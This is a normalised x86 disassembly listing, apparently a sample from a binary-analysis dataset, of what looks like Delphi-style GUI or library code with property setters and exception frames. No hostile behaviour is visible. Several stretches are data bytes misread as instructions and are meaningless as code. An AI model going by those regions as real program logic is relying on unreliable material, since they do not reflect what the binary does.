mov edx [ rw-data ]
mov [ edx ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_455774
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov dl 0x1
call sub_45735c
mov ecx r-xdata
mov edx sub_4348bc
mov eax [ r-xdata ]
call sub_413b38
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442d17
lea eax [ ebp - 0x10 ]
call sub_404050
lea eax [ ebp - 0x4 ]
call sub_404050
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_442d80
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_442ddf
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442de6
retn
mov eax rw-data
call sub_40d19c
call sub_442b10
mov eax rw-data
mov ecx 0x16
mov edx [ r-xdata ]
call sub_404acc
mov eax rw-data
call sub_404050
mov eax rw-data
call sub_404050
sub_442de8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_442e6e
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442e75
retn
call GetVersion
and eax 0xff
cmp ax 0x4
setae [ rw-data ]
call sub_442b98
mov eax [ r-xdata ]
call sub_4139ac
mov eax [ r-xdata ]
call sub_413a4c
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_4139f8
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_4139f8
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_4139f8
sub_443024
stc
push ebx
push eax
inc [ esi + esi + 0x44 ]
add [ esi + esi + 0x38900044 ] cl
inc esp
add [ eax + 0x11004438 ] dh
push esp
inc ebx
jne r-xdata
inc eax
je r-xdata
add [ eax + 0x32 ] cl
inc ebx
jne r-xdata
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add al bl
pop edi
inc ecx
add [ eax + 0x48 ] dl
inc ecx
add [ eax ] ah
push esp
inc ecx
fdiv [ eax + eax * 2 ]
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
pop es
adc [ ebx + eax * 2 + 0x75 ] edx
jae r-xdata
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
jl r-xdata
inc eax
add [ edx + edi ] bl
inc esp
add [ edx + edi + 0x44 ] ch
add [ esp + ebp * 4 + 0x476c0041 ] bh
inc ecx
add [ ebp + ebp * 4 - 0x4d0fffbf ] dl
inc ecx
dec esp
imul esi [ ebx + 0x74 ] 0x3170c08b
inc esp
add [ edi ] al
or eax 0x6f685354
jb r-xdata
add [ eax ] bl
push ebx
inc ecx
add [ eax - 0x4bffbe9e ] al
bound eax [ ecx ]
mov eax 0xbc004162
bound eax [ ecx ]
add al 0x57
inc ecx
add [ eax ] dh
inc ecx
add [ esp + 0x65600041 ] cl
inc ecx
add [ eax + 0x5e ] dl
inc ecx
add [ ebp + 0x66100041 ] bl
inc ecx
add [ eax + 0x40 ] al
inc esp
add [ eax + 0x60 ] al
inc ecx
add [ eax + 0x52 ] ah
inc ecx
add ah bl
pushad
inc ecx
add [ ecx ] bl
inc ecx
add [ eax - 0x4fffbe9f ] cl
push esi
inc ecx
add [ eax ] bl
arpl [ ecx ] ax
inc esp
pop ecx
inc ecx
add [ eax ] bl
pop edx
inc ecx
add [ ebx + 0x41 ] dl
add [ ebx + 0x41 ] ah
add [ edx + ebx * 2 + 0x41 ] bh
add al dl
pop edx
inc ecx
add [ ebx + ebx * 2 + 0x41 ] bh
add [ ebx * 2 + 0x5d6c0041 ] dl
inc ecx
add [ eax ] al
pop esi
inc ecx
add [ eax + 0x60c00041 ] ah
inc ecx
add [ eax + 0x8004163 ] bh
bound eax [ ecx ]
enter 0x4165 0x0
fsub [ ebp + 0x41 ]
add [ 0x6f685354 ] cl
jb r-xdata
outsd
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
add al 0x2b
inc ecx
add [ edx ] al
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0x30c40000
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x31 ] dh
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + esi + 0x44 ] bl
add [ eax ] dh
add [ eax ] al
add [ ecx + 0x41 ] cl
add ah al
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add [ eax ] al
add al [ eax ]
out dx al
add ah bl
xor eax [ eax + eax + 0x38 ]
aas
inc esp
add ah cl
mov al 0x41
add [ ebp + ebp * 4 - 0x5253ffbf ] dh
inc ecx
add ah dl
mov al 0x41
add al cl
cmp [ eax + eax - 0x50 ] eax
mov bl 0x41
add [ ebx + esi * 4 + 0x41 ] dl
add al ch
mov dl 0x41
add [ eax ] bl
mov bl 0x41
add ah ch
mov dl 0x41
add [ eax ] dh
xor eax 0x3d600044
inc esp
add al bh
cmp al 0x44
add [ eax + eax * 2 ] dh
inc esp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + edx + 0x640040 ] ch
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
js r-xdata
xchg esp eax
lodsd [ esi ]
inc ecx
inc ebx
jne r-xdata
add al dh
mov dl 0x41
dec esp
imul esi [ ebx + 0x74 ] r-xdata
cmp al 0x22
inc ecx
add [ eax ] al
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0x31e00000
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + esi ] dh
inc esp
add [ eax + 0x32 ] bh
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x32 ] dl
inc esp
add [ edx + esi + 0x44 ] ah
add [ eax + 0x78000000 ] ah
inc esp
add [ eax + esi * 4 + 0x34d00041 ] dh
inc eax
add [ eax ] cl
stosb [ edi ]
inc ecx
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
sub_44325a
out dx eax
inc [ edi + edi + 0x3fac0044 ]
inc esp
add [ 0x73754354 ] cl
je r-xdata
inc eax
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
mov eax eax
js r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41b290
test bl bl
jle r-xdata
mov edx esi
call sub_443780
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax - 0x63ffbe4f ] ah
mov cl 0x41
add ah dl
mov cl 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
add [ edi ] al
or eax 0x73754354
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
add [ edx + esi * 4 ] dh
inc ecx
add [ eax ] cl
mov dl 0x41
add [ eax ] bh
mov dl 0x41
add [ eax - 0x4f ] bl
inc ecx
add ah ch
mov cl 0x41
add [ eax - 0x4e ] al
inc ecx
add al dl
cmp [ eax + eax - 0x1c ] al
cmp [ eax + eax - 0x8 ] al
cmp [ eax + eax + 0xc ] al
cmp [ eax + eax + 0x20 ] eax
cmp [ eax + eax + 0x34 ] eax
cmp [ eax + eax + 0x48 ] eax
cmp [ eax + eax + 0x5c ] eax
cmp [ eax + eax + 0x70 ] eax
cmp [ eax + eax - 0x7c ] eax
cmp [ eax + eax - 0x68 ] eax
cmp [ eax + eax - 0x64 ] eax
cmp [ eax + eax - 0x60 ] eax
cmp [ eax + eax - 0x5c ] eax
cmp [ eax + eax - 0x58 ] eax
cmp [ eax + eax - 0x54 ] eax
cmp [ eax + eax - 0x50 ] eax
cmp [ eax + eax - 0x4c ] eax
cmp [ eax + eax - 0x48 ] eax
cmp [ eax + eax - 0x44 ] eax
cmp [ eax + eax - 0x40 ] eax
cmp [ eax + eax - 0x3c ] eax
cmp [ eax + eax + 0xb ] eax
push esp
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x95e85653
add bh ah
dec [ ebx - 0x740f7426 ]
inc esi
pop esp
test eax eax
je r-xdata
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
loopne r-xdata
add [ eax ] al
pushad
xor eax [ eax + eax + 0x18 ]
add [ eax ] al
add [ eax + 0x2b ] ch
inc ecx
add ah al
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
inc esp
add [ edi + ebp + 0x44 ] cl
add [ ebx ] al
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0x32e80000
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x33 ] ah
inc esp
add [ eax ] bl
sub_44336c
push ebx
push esi
call sub_403608
mov ebx edx
mov esi eax
mov eax [ esi + 0x5c ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41b290
test bl bl
jle r-xdata
mov edx esi
call sub_443780
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
sub_4433dc
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41ada4
mov edi [ esi + 0x2c ]
mov eax edi
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebx
call sub_443484
sub_443410
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4433a0
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x5c ]
mov edi [ edx + 0x30 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_414060
mov eax [ ebx + 0x5c ]
mov eax [ eax + 0x30 ]
mov ecx ebx
mov edx esi
call sub_4141ec
sub_443458
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x58 ]
call sub_40445c
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x58 ]
mov edx esi
call sub_4040a4
mov eax [ ebx + 0x5c ]
test eax eax
je r-xdata
mov edx [ eax ]
call [ edx + 0x30 ]
sub_443484
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x5c ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_443780
mov edx ebx
mov eax esi
call sub_443760
sub_4434ac
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_443484
sub_4434d8
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0x5c ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_458128
test al al
jne r-xdata
mov edx ebx
mov eax edi
mov si 0xfff3
call sub_403490
test al al
jne r-xdata
mov al 0x1
mov eax ebx
call sub_41b31c
test al al
jne r-xdata
mov ecx ebx
xor edx edx
mov eax 0xb040
call sub_4346e8
dec eax
je r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_443530
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0x5c ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_458150
test al al
jne r-xdata
mov edx ebx
mov eax edi
mov si 0xfff0
call sub_403490
test al al
jne r-xdata
mov al 0x1
mov eax ebx
call sub_41b338
test al al
jne r-xdata
mov ecx ebx
xor edx edx
mov eax 0xb03f
call sub_4346e8
dec eax
je r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_443588
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_41a944
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov [ ebx + 0x30 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov esi eax
mov [ ebx + 0x34 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_44370c
mov [ ebx + 0x58 ] 0x0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_4435f4
push ebx
push esi
push edi
call sub_403608
mov ebx edx
mov edi eax
mov eax [ edi + 0x34 ]
call sub_403294
jmp r-xdata
mov esi [ edi + 0x30 ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov eax esi
call sub_414258
call sub_403294
mov eax [ edi + 0x30 ]
call sub_403294
mov edx ebx
and dl 0xfc
mov eax edi
call sub_41a990
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4035f0
sub_443644
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ eax + 0x4 ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
sub_44368c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_4141cc
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_403444
mov edx edi
call sub_443410
sub_4436d8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x38 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x34 ]
call sub_444edc
pop esi
pop ebx
retn
mov edx [ ebx + 0x34 ]
call sub_444f20
mov edx ebx
mov eax [ ebx + 0x38 ]
call sub_41aa14
sub_443718
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_41ac60
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x38 ]
jne r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax esi
call sub_443780
sub_443760
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_414014
mov [ esi + 0x5c ] ebx
mov edx ebx
mov eax esi
call sub_41aa14
pop esi
pop ebx
retn
sub_443780
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_41430c
test eax eax
jl r-xdata
pop esi
pop ebx
retn
xor eax eax
mov [ esi + 0x5c ] eax
sub_44379c
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x42 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov edx ebx
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
test [ ebx + 0x1c ] 0x10
je r-xdata
inc esi
xor edi edi
pop edi
pop esi
pop ebx
retn
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
dec esi
jne r-xdata
cmp [ esi + 0x250 ] 0x0
je r-xdata
mov eax [ esi + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_443804
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov [ esp ] eax
mov eax [ esi + 0x8 ]
call sub_44dfb0
mov ebx eax
mov ax [ esi + 0x4 ]
mov edx ebx
call sub_446778
mov ebp eax
test bp bp
je r-xdata
xor eax eax
mov eax [ esp ]
mov eax [ eax + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp bp [ ebx + 0x84 ]
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
mov ebx [ eax + edi * 4 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
jmp r-xdata
cmp [ ebx + 0x90 ] 0x0
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_44400c
mov edx ebp
call sub_44406c
inc eax
je r-xdata
sub_443890
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x4a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_4438b0
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x52 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_4439c8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41b24c
mov [ esi + 0x6a ] 0x1
mov [ esi + 0x80 ] 0xffffffff
mov [ esi + 0x86 ] 0x1
xor eax eax
mov [ esi + 0x90 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax esi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_443a1c
push ebx
push esi
call sub_403608
mov ebx edx
mov esi eax
mov eax [ esi + 0x98 ]
call sub_403294
mov eax [ esi + 0x9c ]
call sub_403294
cmp [ esi + 0x90 ] 0x0
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44336c
test bl bl
jle r-xdata
lea eax [ esi + 0x90 ]
call sub_40d19c
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
sub_443a6c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_414850
mov edx [ ebx + 0x64 ]
mov edi esi
mov eax edi
call sub_443b18
mov dl [ ebx + 0x69 ]
mov eax edi
call sub_443b78
mov dl [ ebx + 0x6a ]
mov eax edi
call sub_443c80
mov edx [ ebx + 0x74 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebx + 0x7c ]
mov eax edi
call sub_443db8
mov edx [ ebx + 0x80 ]
mov eax edi
call sub_443e18
mov dx [ ebx + 0x84 ]
mov eax edi
call sub_443e74
mov dl [ ebx + 0x86 ]
mov eax edi
call sub_443ed8
push [ ebx + 0x44 ]
push [ ebx + 0x40 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax [ ebx + 0x48 ]
mov [ edi + 0x48 ] eax
mov eax [ ebx + 0x4c ]
mov [ edi + 0x4c ] eax
mov eax [ ebx + 0x38 ]
mov [ edi + 0x38 ] eax
mov eax [ ebx + 0x3c ]
mov [ edi + 0x3c ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_443b18
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
mov edx [ ebx + 0x64 ]
call sub_40445c
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea eax [ ebx + 0x64 ]
mov edx [ esp ]
call sub_4040a4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x4c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403444
test eax eax
je r-xdata
sub_443b78
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x68 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x68 ] 0x1
xor edx edx
push ebp
push sub_443c70
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x69 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x68 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x69 ] bl
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x6c ] 0x0
jle r-xdata
inc edi
xor esi esi
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x69 ] 0x0
je r-xdata
inc esi
dec edi
jne r-xdata
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x50 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
call sub_4436d0
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ r-xdata ]
call sub_403444
test eax eax
je r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
mov edx esi
call sub_4436bc
mov ebx eax
cmp ebx [ ebp - 0x4 ]
je r-xdata
mov eax [ ebx + 0x6c ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x6c ]
jne r-xdata
xor edx edx
mov eax ebx
call sub_443b78
sub_443c80
push ebx
push esi
push edi
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x6a ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x5c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov dl [ eax + 0x58 ]
cmp dl 0x1
jne r-xdata
mov al [ esp ]
mov [ ebx + 0x6a ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
cmp dl 0x2
jne r-xdata
mov al [ esp ]
mov [ ebx + 0x6a ] al
jmp r-xdata
inc edi
dec esi
jne r-xdata
mov dl [ esp ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov [ esp ] 0x1
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403444
test eax eax
je r-xdata
sub_443cf8
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax ebp
mov edx [ ebx + 0x78 ]
call sub_40445c
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
lea eax [ ebx + 0x78 ]
mov edx ebp
call sub_4040a4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_414170
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x60 ]
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_414170
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
sub_443d60
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
cmp eax [ ebx + 0x74 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
mov [ ebx + 0x74 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403444
test eax eax
je r-xdata
sub_443db8
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
mov edx [ ebx + 0x7c ]
call sub_40445c
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea eax [ ebx + 0x7c ]
mov edx [ esp ]
call sub_4040a4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403444
test eax eax
je r-xdata
sub_443e18
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
cmp eax [ ebx + 0x80 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
mov [ ebx + 0x80 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403444
test eax eax
je r-xdata
sub_443e74
push ebx
push esi
push edi
push ecx
mov [ esp ] dx
mov ebx eax
mov ax [ esp ]
cmp ax [ ebx + 0x84 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov ax [ esp ]
mov [ ebx + 0x84 ] ax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov dx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403444
test eax eax
je r-xdata
sub_443ed8
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
cmp bl [ ebp + 0x86 ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebp + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov [ ebp + 0x86 ] bl
mov eax ebp
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp + 0x50 ]
call sub_414170
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x74 ]
mov eax [ ebp + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ r-xdata ]
call sub_403444
test eax eax
je r-xdata
sub_443f38
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ esi + 0x64 ]
call sub_40445c
jne r-xdata
xor eax eax
jmp r-xdata
